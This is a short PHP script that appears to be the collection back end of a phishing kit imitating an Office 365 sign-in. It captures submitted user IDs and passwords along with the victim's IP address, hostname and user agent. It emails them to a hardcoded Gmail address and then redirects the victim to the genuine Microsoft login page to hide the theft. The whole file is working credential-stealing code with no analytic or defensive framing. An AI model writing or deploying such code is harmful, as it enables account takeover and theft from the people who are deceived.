<?php
if($_POST["userid"] != "" and $_POST["pass"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Office Info-----------------------\n";
$message .= "User ID        : ".$_POST['userid']."\n";
$message .= "Password       : ".$_POST['pass']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- BQ Pages [.] RU --------------|\n";
$send = "sunray11011@gmail.com";
$subject = "Card | $ip";
{
mail("$send", "$subject", $message);   
}
header ("Location: https://login.microsoftonline.com");
?>